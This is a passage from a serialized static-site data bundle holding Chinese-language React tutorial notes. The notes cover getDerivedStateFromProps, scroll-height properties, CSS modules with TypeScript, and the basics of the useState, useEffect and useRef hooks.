{}\n\n\n1\n2\n3\n4\n\n\n下面这个例子，父组件每隔5秒进行重新渲染并且改变了传给子组件的props值，而子组件的显示内容是依赖props里的email值并且还能用户输入改变这个值，这样就形成了一个“受控和非受控混在一起使用”的场景。那就可以使用getderivedstatefromprops()了，使用前一定要明白两点！一是，不管父组件是否改变了传给子组件的props值，只要父组件进行了重新渲染，就会触发子组件的getderivedstatefromprops()；二是，子组件的setstate()也会触发getderivedstatefromprops()，而getderivedstatefromprops()本身又会更新子组件的state。带着这两点后去读下面的例子，特别是那段多行注释。\n\ntimer.tsx\n\nimport react, { component } from 'react';\nimport emailinput from './components/emailinput';\n\nclass timer extends component<any, { count: number, email: string }> {\n    interval;\n    state = { count: 0, email: \"example@google.com\" };\n    componentdidmount() {\n        // 每5秒就调用setstate，进而重新渲染父元素\n        this.interval = setinterval(\n            () =>\n                this.setstate(prevstate => ({\n                    count: prevstate.count + 1,\n                    email: prevstate.email + '1'\n                })),\n            5000\n        );\n    }\n    componentwillunmount() { clearinterval(this.interval); }\n    render() {\n        return <emailinput email={this.state.email} />;\n    }\n}\n\nexport default timer;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nemailinput.tsx\n\nimport react, { component } from \"react\";\n\nclass emailinput extends component<{ email: string }> {\n    state = {\n        email: this.props.email,\n        prevpropsemail: this.props.email\n    };\n    static getderivedstatefromprops(props, state) {\n        /*\n            这个判断非常重要。首先只看子组件，假设父组件不重新渲染传给子组件的props也不变，\n            子组件的事件回调handlechange里使用setstate()后，会更新一次state，\n            而setstate()会触发重新渲染，从而触发getderivedstatefromprops()和render()，\n            又由于getderivedstatefromprops()的return语句，又会更新一次state。\n            第二次的state更新数据来源于props，props是假设不变的，那state会被重置成初始值，\n            现象就是输入框删除或修改值时，输入框没有变化，change事件相当于失效了。\n            然后再看父组件，父组件只要重新渲染就会触发子组件的getderivedstatefromprops()，\n            不管传给子组件的props变不变。父组件重新渲染，子组件的state就会被重置。\n            综合看上面两点，就需要给getderivedstatefromprops()内部加上这样的判断条件，\n            加上后不会因为父组件的随意重新渲染从而让子组件重置state，除非props也改变了，\n            子组件的setstate()结果也不会被覆盖了，只有当来自父组件的数据源改变才更新state。\n        */\n        if (props.email !== state.prevpropsemail) {\n            // 该生命周期函数是static的，无法使用this，得事先存储props相关的值prevpropsemail\n            return {\n                email: props.email,\n                prevpropsemail: props.email\n            };\n        }\n        return null;\n    }\n    render() {\n        return <input onchange={this.handlechange} value={this.state.email} />;\n    }\n    handlechange = event => {\n        this.setstate({ email: event.target.value });\n    };\n}\nexport default emailinput;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n我们建议除了“受控和非受控混在一起使用”这个场景下使用getderivedstatefromprops()生命周期函数以外，其他场景下尽量不要使用它（可能会带来意想不到的问题）。\n\n像前面的那个例子，是可以把组件变为完全受控组件的，把数据和处理逻辑都放到父组件中去，那子组件的展示数据从props里读取，并且事件处理使用props里的回调函数，这种做法就是上一节的状态提升。这样可以避免使用getderivedstatefromprops()，改造例子就不写了就参考状态提升那节的例子。\n\n当然，还有两种方法。给父组件加上key这个属性，先重置子组件的某些字段时，我们就改变父组件的key值让子组件直接重新初始化。\n\nclass emailinput extends component {\n  state = { email: this.props.defaultemail };\n\n  handlechange = event => {\n    this.setstate({ email: event.target.value });\n  };\n\n  render() {\n    return <input onchange={this.handlechange} value={this.state.email} />;\n  }\n}\n// 当 key 变化时， react 会创建一个新的而不是更新一个既有的组件\n<emailinput\n  defaultemail={this.props.user.email}\n  key={this.props.user.id}\n/>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n另一个方法就是，我们不直接判断email是否变化，我们直接认为它是改变了一个user，那么判断条件就会跟userid有关了。只要userid改变了，就直接更新子组件中所有跟user有关的信息。\n\nclass emailinput extends component {\n  state = {\n    email: this.props.defaultemail,\n    prevpropsuserid: this.props.userid\n  };\n\n  static getderivedstatefromprops(props, state) {\n    // 只要当前 user 变化，\n    // 重置所有跟 user 相关的状态。\n    // 这个例子中，只有 email 和 user 相关。\n    if (props.userid !== state.prevpropsuserid) {\n      return {\n        prevpropsuserid: props.userid,\n        email: props.defaultemail\n      };\n    }\n    return null;\n  }\n\n  // ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 说说scrollheight\n\n其实这一小节不应该放这里，主要是上面用到了scrollheight，这里就说点关于scrollheight的东西。我们现在以“滚动容器”为主视觉，它会有一些和滚动有关的属性，如下。但要明确它们都是滚动容器的本身属性（生活中的例子，将“陀螺手柄”和“拉条”看作为一个整体，拉条在陀螺内部的部分我们看不见，拉动的距离其实就是手里拉条这端距离靠近手柄这边外壳的距离）。\n\n * clientheight：它的值为容器的content高度+上下内边距-水平滚动条宽度，没有水平滚动条就不用减。就理解为衡量容器的“总高度”。\n * offsetheight：它的值为容器的content高度+上下内边距+上下边框，其实常用的是clientheight。\n * scrollheight：一般是容器里的总内容撑开高度最后加上容器的上下内边距。就理解为衡量总内容的“总高度”，mdn的概念有点难以理解，抓住关键字“填充所有内容”即可。\n * scrolltop：其实就是滚动的距离，这个距离是容器的“顶部” 与 容器里的总内容“顶部”的一个距离。\n\n你可以想象一下，滚动条在最顶端时的情况，此时容器的顶部与总内容的顶部是“重合的”，它们之间此时没有距离，那么scrolltop就为0了。\n\n而当滚动条在最底端时，容器的底部与总内容的底部是“重合的”，那么它们的“顶部”的距离此时是最大的，那么此时的距离值到底是多少呢？那就是容器的scrollheight减去clientheight，也就是减去重合的这部分高度。所以经常用element.scrollheight - element.scrolltop === element.clientheight来判断内容或者说滚动条是否滚动到了底部。\n\n其实还有一些细节问题，这个scrollheight为什么额外算上了“容器的上下内边距”，其实这个与触发滚动的条件有关了。比如css中怎么触发滚动？先设置overflow: auto或者overflow: scroll，当总内容的“布局尺寸”超过容器的content区域就会触发滚动。布局尺寸你可以先理解为所有盒子属性加起来（包括margin）（还可以理解为撑开的高度），容器的content你可以理解为就是元素的height和width（正常盒模型）。\n\n那么js这边呢？其实就是上面css条件的“两侧”都加上了“容器的上下内边距”，例如容器的content加上“容器的上下内边距”不就是刚刚说的clientheight嘛，内容的布局尺寸加上“容器的上下内边距”不就是刚刚说的scrollheight，也就是一旦scrollheight超过clientheight就会触发滚动。这样加也是js为了用clientheight整体描述容器，以及用scrollheight整体描述它的总内容。\n\n\n# 八、react中的css模块化\n\n\n# 8.1 原生css的问题\n\n原生css在项目中使用时经常会出现全局污染、命名混乱和无法共享变量等问题。\n\n全局污染：原生css在使用时没有本地作用域，它声明的样式都是全局的。也就是说页面上的元素可以使用项目中任何css文件中的样式，当然前提是能访问上并匹配上，并且css样式还能覆盖前面的部分样式。这就导致在修改bug和重构项目时，分不清哪些css作用于哪些html，修改css要瞻前顾后怕影响到其他组件。\n\n命名混乱：原生css的选择器命名在项目过大时会变得过于困难和混乱。选择器的名称会考虑根据它所处的页面和组件等结构来书写前缀，不然很容易和其他元素的选择器重名。又或者是多人开发一个大型项目，并且多分支进行，这样的命名冲突会源源不同，而命名风格还各不相同。\n\n无法共享变量：像color这样的样式变量，在一个页面的很多选择器上是共用的，又或者一段样式要在很多页面上是共用的，原生的css也没有非常好的解决办法。\n\n\n# 8.2 css模块化\n\ncss模块化可以将css样式变成一个个独立存在的模块，css模块内部的内容当然也是独立的不会影响到其他css模块，在需要使用css时就将需要的css模块导入到对应的react组件中。这样就可以解决原生css的全局污染和命名混乱的问题，不好的地方是需要一点点配置，然后它在debug时显示的classname会比较奇怪（css样式动态注入的，属于css in js的范畴了）调试会麻烦一些。\n\n在一般的react项目中，css文件初始导入方式是这样的：import './xxx.css'，其实这还是原生的css用法，只不过将css分割成小小的几部分，还是不具有独立性。真正做到css模块化，需要这样写：import styles from './xxx.css'，将css样式以一个对象的形式导入到react组件中。\n\n而import styles from './xxx.css'这样的css导入写法可能会报错，这个就是因为css缺少ts声明文件（*.d.ts），解决的方法就是在项目的src目录下创建一个css的ts声明文件custom.d.ts：\n\n// 声明一个es6模块，导入文件通常是*.css这样的，这个模块以一个对象形式暴露\ndeclare module '*.css' {\n    const css: { readonly [key: string]: string };\n    export = css;\n}\n\n\n1\n2\n3\n4\n5\n\n\n然后就是css文件的命名规范，头部名称基本和tsx/jsx文件一致，.css后缀的前面必须得添加一个.module，以免出现不必要的问题（其实目前添加.module后就不用自己写ts声明文件了，上一步custom.d.ts可以省略）。别忘了将css文件和tsx/jsx文件放在同一个文件夹（例如某个component）下。\n\n接下来我们只需要将ui元素与这个styles对象关联来就可以让样式生效了，具体就是在元素jsx上使用classname绑定styles里对应的字段，看清楚不是style字段哦！\n\n// 原生css\nimport './numberinput.css';\n\nreturn <input classname=\"inputdiv\" value={this.props.inputvalue} onchange={this.handlevalue} />\n\n// css模块化，文件名中间是module\nimport styles from './numberinput.module.css';\n\nreturn <input classname={styles.inputdiv} value={this.props.inputvalue} onchange={this.handlevalue} />\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 8.3 css模块智能提示\n\n因为我们使用ts，styles这个对象里的字段提示是非常有必要的，那么就得安装一个插件npm install typescript-plugin-css-modules --save-dev。\n\n然后打开项目的tsconfig.json文件，在compileroptions项中注册上面这个插件：\n\n\"compileroptions\": {\n    \"plugins\": [{ \"name\": \"typescript-plugin-css-modules\" }]\n}\n\n\n1\n2\n3\n\n\n如果使用的vscode编辑器，需要开启settings.json中的\"typescript.enablepromptuseworkspacetsdk\": true这个选项（vscode须得1.45版本以上才有这个选项）就能让styles后面拥有智能提示。\n\n{\n    \"typescript.tsdk\": \"node_modules/typescript/lib\", // 根据项目的实际typescript所在填写\n    \"typescript.enablepromptworkspacetsdk\": true\n}\n\n\n1\n2\n3\n4\n\n\n\n# 8.4 用类似方式加载资源\n\n像png、svg、jpg等资源文件，都可以通过上面的方式来加载，也不需要自己写ts声明文件，因为react项目基本上都已经准备好了。\n\nimport styles from './numberinput.module.css';\nimport logo from './assets/images/logo.svg';\n\n<img src={logo} classname={styles.applogo} alt=\"logo\" />\n\n\n1\n2\n3\n4\n\n\n如果是加载字体，就用原生css加载字体方式（@font-face加载字体，font-family使用字体）具体可以看这篇——字体。",charsets:{cjk:!0}},{title:"2.React进阶",frontmatter:{title:"2.React进阶"},regularPath:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0React/2.react%E8%BF%9B%E9%98%B6.html",relativePath:"book-web/web前端js框架/学习React/2.react进阶.md",key:"v-40f75820",path:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0React/2.react%E8%BF%9B%E9%98%B6.html",headers:[{level:2,title:"React Hook简介",slug:"react-hook简介",normalizedTitle:"react hook简介",charIndex:14},{level:3,title:"React Hook之前的状况",slug:"react-hook之前的状况",normalizedTitle:"react hook之前的状况",charIndex:31},{level:3,title:"React Hook是什么",slug:"react-hook是什么",normalizedTitle:"react hook是什么",charIndex:487},{level:3,title:"常见钩子和使用规则",slug:"常见钩子和使用规则",normalizedTitle:"常见钩子和使用规则",charIndex:782},{level:2,title:"useState状态钩子",slug:"usestate状态钩子",normalizedTitle:"usestate状态钩子",charIndex:1067},{level:3,title:"如何使用useState",slug:"如何使用usestate",normalizedTitle:"如何使用usestate",charIndex:1084},{level:3,title:"要合并多个state变量吗",slug:"要合并多个state变量吗",normalizedTitle:"要合并多个state变量吗",charIndex:2132},{level:2,title:"useEffect副作用钩子",slug:"useeffect副作用钩子",normalizedTitle:"useeffect副作用钩子",charIndex:2879},{level:3,title:"纯函数与副作用",slug:"纯函数与副作用",normalizedTitle:"纯函数与副作用",charIndex:2898},{level:3,title:"如何使用useEffect",slug:"如何使用useeffect",normalizedTitle:"如何使用useeffect",charIndex:3276},{level:3,title:"useEffect注意事项",slug:"useeffect注意事项",normalizedTitle:"useeffect注意事项",charIndex:6616},{level:2,title:"useRef钩子",slug:"useref钩子",normalizedTitle:"useref钩子",charIndex:9773},{level:2,title:"useContext钩子",slug:"usecontext钩子",normalizedTitle:"usecontext钩子",charIndex:11105}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"React Hook简介 React Hook之前的状况 React Hook是什么 常见钩子和使用规则 useState状态钩子 如何使用useState 要合并多个state变量吗 useEffect副作用钩子 纯函数与副作用 如何使用useEffect useEffect注意事项 useRef钩子 useContext钩子",content:"# React进阶\n\n\n# React Hook简介\n\n\n# React Hook之前的状况\n\nReact项目的开发是组件化的开发，组件可以彼此独立、可以自由组装、也可以复用到很多地方。可是随着项目变得更大更复杂，一些组件会变得非常冗长和复杂，特别是组件的componentDidXxx()等声明周期函数中充满了各种各样处理逻辑的代码，相互关联的代码修改可能还需要同步修改另一处，维护起来会无比麻烦。\n\n又由于各自的组件有各自的状态以及状态逻辑，往往有部分状态逻辑的功能是基本相同的可以复用的，比如可以使用render props和高阶组件等方案，这类方案需要重新组织组件结构（render props是将一个组件当作另一个组件的属性通过props传入，高阶组件是另外套一层组件），会很麻烦也使得代码难以理解。\n\nreact hook的出现，可以将相互关联的部分代码拆分成更小的函数（并非强制按照生命周期划分），也可以在无需修改组件结构的情况下复用状态逻辑，最后就是可以在非class的情况下可以使用更多的React特性（class组件有诸如this、压缩问题）。\n\n\n# React Hook是什么\n\nhook（钩子）是一个处理消息的程序段，我们可以将钩子挂到需要被监听的程序里，用于截取被监听程序里的某段消息或特定事件。是在消息发出了但还没达到被监听程序前，就将消息截取了，然后可以加工处理消息，或不处理强制让消息停止传递。\n\nreact hook就利用了这样的机制，当React的函数式组件（hook在类组件是不起作用的）想实现“API数据访问”、“异步修改组件状态”、“组件生命周期”和“处理副作用”等功能时，就可以使用相对应的钩子将功能模块代码勾到组件中。也就是说react hook是一类特殊的函数，可以为React函数式组件注入特殊的功能。\n\n\n# 常见钩子和使用规则\n\nreact hook中常用的钩子：useState()、useEffect()、useContext()、useReducer()。当然也可以自定义hook，但要遵循钩子的命名规范前缀是use，例如useXxx()。更多钩子介绍可以看后面章节或者查看官方文档Hook API 索引。\n\nreact hook是js函数，使用它会有两个额外的规则：\n\n * 只能在函数最外层调用hook。不要在循环、条件判断或者子函数中调用。\n * 只能在React的函数式组件中调用hook（自定义hook中也可以调用hook）。不要在其他js函数中调用。\n\n\n# useState状态钩子\n\n\n# 如何使用useState\n\n在类组件中使用state，是在constructor函数中对this.state={xxx: xxx}进行初始化，在组件其他地方this.state.xxx使用这个state变量的值，还可以通过this.setState()修改它的值。而在函数式组件中没有this，使用state的话需要用useState()钩子将state功能勾入到这个函数组件里，形式是const [something, setSomething] = useState(param)（变量名自己取，第二个参数是一个方法，最好是setXxx的形式）。\n\nimport React, { useState } from 'react';\n\nfunction Example() {\n  // 相当于class组件里的this.state = { count: 0 };\n  const [count, setCount] = useState(0);\n  // 其实Example可能会被多次调用（父组件更新等），那这段段代码会多次执行，不用担心多次声明初始化count，React内部做了优化处理\n\n  return (\n    <div>\n      <p>You clicked {count} times</p>\n      <button onClick={() => setCount(count + 1)}>\n        Click me\n      </button>\n    </div>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nconst [count, setCount] = useState(0);使用了useState钩子声明了一个state变量（该变量实际在react内部），useState()会返回一个数组，数组的第一个值就是这个state变量的值（临时给你用），数组的第二个值是修改该state变量的函数，useState()的唯一入参是这个state变量最初的值。在后续的使用过程中，直接用count就可以了，比类组件的this.state.count方便多了。\n\n注意声明接收变量时要使用const，不要使用let也别用count=8来修改count（局部覆盖没什么意义），要使用setCount修改实际的count，还能触发重新渲染（类似于类组件的this.setState()）。\n\n\n# 要合并多个state变量吗\n\n你可能想在一次useState()调用中传入一个包含了所有state的对象（合并多个state变量），可以是可以的，例如\n\n// 类组件的state\nthis.state = { left: 0, top: 0, width: 100, height: 100 };\n// 函数式组件的state\nconst [state, setState] = useState({ left: 0, top: 0, width: 100, height: 100 });\n\n\n1\n2\n3\n4\n\n\n但是我们仍然建议不对多个state变量进行合并，因为拆分后的state变量可以在某些情况下单独抽取到一个函数方法中。当然你也可以合并一部分独立拆分另一部分，可能会比较混乱。如果state的逻辑开始变得复杂，可以用reducer来管理它，或使用自定义Hook。\n\nfunction Box() {\n  // 拆分state变量，抽取到一个函数方法中\n  const position = useWindowPosition();\n  const [size, setSize] = useState({ width: 100, height: 100 });\n  // ...\n}\n\nfunction useWindowPosition() {\n  const [position, setPosition] = useState({ left: 0, top: 0 });\n  useEffect(() => {\n    // ...\n  }, []);\n  return position;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# useEffect副作用钩子\n\n\n# 纯函数与副作用\n\n纯函数的特征：\n\n    1)该函数不会对入参本身进行修改，必须得有return返回值；在相同的入参时，需产生相同的返回值。\n    2)该函数得没有副作用；返回值可以与入参无关（有关也可以），但是不能与入参以外的变量或者其他影响有关（也是在说不能有副作用）。\n\n其中副作用指的是函数除了返回函数值，还对函数产生了附加的影响（与外界有关了，结果不一定可控），例如修改了全局变量（函数外的）、使用了ajax、修改了dom元素、console输出等。\n\nlet a = 0, b = 1, c = 2;\n\nfunction handle(p1, p2) {\n    a ++; // 这行是副作用，去掉这行那这个函数就是纯函数\n    return p1 + p2; // 纯函数必须有return\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 如何使用useEffect\n\nuseEffect钩子可以让开发者在函数式组件中执行副作用操作，其形式是useEffect(() => {}, [xxx])，第一个参数是副作用处理函数，第二个参数是组件的依赖列表（数组形式）。useEffect钩子默认情况在每次渲染后执行，包括挂载时的第一次渲染。\n\nimport React, { useState, useEffect } from 'react';\n\nfunction Example() {\n  const [count, setCount] = useState(0);\n\n  // useEffect钩子\n  useEffect(() => {\n    document.title = `You clicked ${count} times`;\n  }, [count]); // 第二个参数是[count]这样的一个数组\n\n  return (\n    <div>\n      <p>You clicked {count} times</p>\n      <button onClick={() => setCount(count + 1)}>\n        Click me\n      </button>\n    </div>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * 第二个参数不传时（默认情况），在挂载和每次更新后执行（相当于componentDidMount和componentDidUpdate）；\n * 第二个参数为[xxx]时，在挂载和每次更新后并且判断了特定状态之后考虑是否跳过执行，例如下面这个例子；有点像Vue中的watch。\n * 第二个参数为[]空数组时，只在挂载后执行（相当于只componentDidMount，即跳过了componentDidUpdate），因为每次更新后由于依赖列表为空认为状态没有改变就跳过了每次更新后执行effect这个步骤。\n\ncomponentDidUpdate(prevProps, prevState) {\n  if (prevState.count !== this.state.count) { // 对于特定状态的判断，解决性能问题\n    document.title = `You clicked ${this.state.count} times`;\n  }\n}\n// 用useEffect改写上面的，只是使用useEffect钩子更方便更精准。\nuseEffect(() => {\n  document.title = `You clicked ${count} times`;\n}, [count]);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nps：useEffect钩子实际上与componentDidMount或componentDidUpdate有些地方不一样，调度effect时不会阻塞浏览器更新屏幕，这让你的应用看起来响应更快。\n\n在开发class组件时，经常在componentDidMount中添加订阅，在componentWillUnmount中删除订阅，代码比较分散。使用useEffect钩子的清除机制可以解决这个问题，在useEffect最后return一个清除函数即可，会在组件卸载的时候执行清除操作。\n\n// 模拟componentDidMount\nuseEffect(() => {\n  const timer = setInterval(() => {\n    // ...\n  }, 1000)\n  // 模拟componentWillUnmount\n  return function cleanup() {\n    clearInterval(timer);\n  };\n}, []);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n其实useEffect中return的清除函数，不是只在卸载组件的时候执行一次，而是在执行新的effect的时候会清除上一个effect（并调用上一个effect的return的清除函数），这是hook设计的一个默认行为，是为了简化id变化时要先删除原先的订阅再去添加新订阅来更新展示信息这样一个麻烦的步骤，例如下面这个例子。\n\ncomponentDidMount() {\n  ChatAPI.subscribeToFriendStatus(\n    this.props.friend.id,\n    this.handleStatusChange\n  );\n}\ncomponentDidUpdate(prevProps) {\n  // 取消订阅之前的 friend.id\n  ChatAPI.unsubscribeFromFriendStatus(\n    prevProps.friend.id,\n    this.handleStatusChange\n  );\n  // 订阅新的 friend.id\n  ChatAPI.subscribeToFriendStatus(\n    this.props.friend.id,\n    this.handleStatusChange\n  );\n}\ncomponentWillUnmount() {\n  ChatAPI.unsubscribeFromFriendStatus(\n    this.props.friend.id,\n    this.handleStatusChange\n  );\n}\n// 用useEffect改写上面的，执行新effect时会先运行上一个effect的return的清除函数\nuseEffect(() => {\n  ChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange);\n  // 返回一个清除函数。它会在上一次的Effect执行完就会调用\n  return function cleanup() {\n    ChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange);\n  };\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n最后就是使用多个useEffect的场景，主要就是为了分割无关的代码，将相同用途的代码放在同一个effect中。\n\nfunction FriendStatusWithCounter(props) {\n  const [count, setCount] = useState(0);\n  useEffect(() => {\n    document.title = `You clicked ${count} times`;\n  });\n\n  const [isOnline, setIsOnline] = useState(null);\n  useEffect(() => {\n    function handleStatusChange(status) {\n      setIsOnline(status.isOnline);\n    }\n\n    ChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange);\n    return () => {\n      ChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange);\n    };\n  });\n  // ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# useEffect注意事项\n\n# 避免不必要的Effect\n\n副作用处理函数内部如果有props或state的相关变量，基本上都会在依赖列表中添加这些相关变量。除非业务需求就是只在挂载时运行一次，即使父组件传来的props或者本组件的state改变了也不影响，这样倒是可以让依赖列表为空数组。像上一小节中的props.friend.id变了，最好是在第二个参数中加上[props.friend.id]。\n\n// 类组件中用prevState.count和this.state.count进行判断，避免不必要的逻辑\ncomponentDidUpdate(prevProps, prevState) {\n  if (prevState.count !== this.state.count) {\n    document.title = `You clicked ${this.state.count} times`;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n// 函数组件中useEffect，要在第二个参数加上依赖数据，比如下面的props.friend.id\nuseEffect(() => {\n  function handleStatusChange(status) {\n    setIsOnline(status.isOnline);\n  }\n\n  ChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange);\n  return () => {\n    ChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange);\n  };\n}, [props.friend.id]); // 仅在 props.friend.id 发生变化时，重新订阅\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# 注意闭包问题\n\n副作用处理函数是个闭包，这意味着这个闭包会记住副作用处理函数在被创建时所处的环境。像上面这个例子，当props.friend.id变化时，触发本组件重新渲染，执行新的effect，执行前会调用旧effect的清除函数并且清除旧effect的闭包形式，然后继续执行这个新的effect。\n\n如果effect中有频繁变化的值，例如在effect里使用setInterval并在其内部执行setState，这种定时器需求一般都是写在componentDidMount中（如果写在componentDidMount中，每次都创建一个新定时器也是不大对的，还容易形成死循环），那么使用useEffect时其依赖列表得是个空数组，就算每隔一段时间调用setState触发重新渲染，但由于useEffect的依赖列表为空数组就会跳过每次更新后的新effect调用。\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n\n  useEffect(() => {\n    // 我们只想让定时器生成一次，不让它在页面更新后再重新创建，那么第二个参数必须是[]空数组\n    const id = setInterval(() => {\n      // 但我们又依赖了state中的count，它还是闭包\n      setCount(count + 1);\n    }, 1000);\n    return () => clearInterval(id);\n  }, []); // 只在挂载后执行\n\n  return <h1>{count}</h1>;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n上面这个写法逻辑上没啥问题，但是由于闭包的原因，setCount(count + 1)中的count其实一直是0（当时setInterval内的这个函数创建时count就是0），那就需要使用setState的函数入参式写法（setState的第一个形参是个函数，这个函数里的形参可以拿到以前的count）。\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n\n  useEffect(() => {\n    const id = setInterval(() => {\n      setCount(c => c + 1); // 在这不依赖于外部的 `count` 变量\n    }, 1000);\n    return () => clearInterval(id);\n  }, []); // 我们的 effect 不使用组件作用域中的任何变量\n\n  return <h1>{count}</h1>;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 注意async问题\n\nuseEffect中处理异步操作时，一般就用promise常用的then处理法；如果要使用async/await，不能直接在处理函数头上加async标识，得新建一个函数加上async标识，最后在处理函数中调用这个新函数。\n\nfunction ProductPage({ productId }) {\n  const [product, setProduct] = useState(null);\n\n  useEffect(() => {// 不能在这里加async\n    // 把这个函数移动到 effect 内部后，我们可以清楚地看到它用到的值productId。\n    async function fetchProduct() {\n      const response = await fetch('http://myapi/product/' + productId);\n      const json = await response.json();\n      setProduct(json);\n    }\n    // 调用这个fetchProduct函数\n    fetchProduct();\n  }, [productId]);\n  // ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n这个新函数是可以定义在effect外部甚至是组件的外部，如果没有依赖的props和state是比较容易挪到外面的，但是如果有依赖还要放在外部，那可以使用useCallback来包裹这个新函数以避免随渲染发生改变，在effect的依赖列表中添加这个新函数的引用。\n\nfunction ProductPage({ productId }) {\n  const fetchProduct = useCallback(() => {\n    // ... Does something with productId ...\n  }, [productId]);\n\n  return <ProductDetails fetchProduct={fetchProduct} />;\n}\n\nfunction ProductDetails({ fetchProduct }) {\n  useEffect(() => {\n    fetchProduct();\n  }, [fetchProduct]);\n  // ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# useRef钩子\n\n在类组件中会用到React.createRef()创建ref，用这个创建出来的ref给组件打上标记，再用它来操作组件的DOM或者获取控件的value等。\n\n在函数组件中使用useRef钩子也可以创建一个ref给组件打标记从而获取组件的DOM以及一些属性，例子如下：\n\nfunction TextInputWithFocusButton() {\n  const inputEl = useRef(null);\n  const onButtonClick = () => {\n    // `current` 指向已挂载到 DOM 上的input元素\n    inputEl.current.focus();\n  };\n  return (\n    <>\n      <input ref={inputEl} type=\"text\" />\n      <button onClick={onButtonClick}>Focus the input</button>\n    </>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nuseRef和React.createRef()的区别：React.createRef()一般用于类组件，用于函数组件的话，一般就只能用在函数外部，原因是用在内部每次渲染都会重新生成一个新引用（每次重新渲染，函数组件都会运行一次）；useRef一般用于函数组件内部，即使每次重新渲染，它都是相同的引用，这样的话它可以模拟类组件中的this。\n\n下面这个例子就是useRef钩子和useEffect钩子结合使用场景，useEffect的闭包场景可能是想拿props，正常拿因为闭包的原因可能拿的值一直没有变化。那么可以用useRef钩子来保存props（模拟this.props），或许还要创建一个useEffect用来更新保存的最新值。当然，下面这种在定时器每隔一段时间读最新props场景不太多见。\n\nfunction Example(props) {\n  // 把最新的 props 保存在一个 ref 中。useRef钩子相当于React.createRef()\n  const latestProps = useRef(props);\n  useEffect(() => {\n    latestProps.current = props;\n  });\n\n  useEffect(() => {\n    function tick() {\n      // 在任何时候读取最新的 props\n      console.log(latestProps.current);\n    }\n\n    const id = setInterval(tick, 1000);\n    return () => clearInterval(id);\n  }, []); // 这个 effect 从不会重新执行\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n要尽可能少的使用React.createRef()和useRef钩子。\n\n\n# useContext钩子",normalizedContent:"# react进阶\n\n\n# react hook简介\n\n\n# react hook之前的状况\n\nreact项目的开发是组件化的开发，组件可以彼此独立、可以自由组装、也可以复用到很多地方。可是随着项目变得更大更复杂，一些组件会变得非常冗长和复杂，特别是组件的componentdidxxx()等声明周期函数中充满了各种各样处理逻辑的代码，相互关联的代码修改可能还需要同步修改另一处，维护起来会无比麻烦。\n\n又由于各自的组件有各自的状态以及状态逻辑，往往有部分状态逻辑的功能是基本相同的可以复用的，比如可以使用render props和高阶组件等方案，这类方案需要重新组织组件结构（render props是将一个组件当作另一个组件的属性通过props传入，高阶组件是另外套一层组件），会很麻烦也使得代码难以理解。\n\nreact hook的出现，可以将相互关联的部分代码拆分成更小的函数（并非强制按照生命周期划分），也可以在无需修改组件结构的情况下复用状态逻辑，最后就是可以在非class的情况下可以使用更多的react特性（class组件有诸如this、压缩问题）。\n\n\n# react hook是什么\n\nhook（钩子）是一个处理消息的程序段，我们可以将钩子挂到需要被监听的程序里，用于截取被监听程序里的某段消息或特定事件。是在消息发出了但还没达到被监听程序前，就将消息截取了，然后可以加工处理消息，或不处理强制让消息停止传递。\n\nreact hook就利用了这样的机制，当react的函数式组件（hook在类组件是不起作用的）想实现“api数据访问”、“异步修改组件状态”、“组件生命周期”和“处理副作用”等功能时，就可以使用相对应的钩子将功能模块代码勾到组件中。也就是说react hook是一类特殊的函数，可以为react函数式组件注入特殊的功能。\n\n\n# 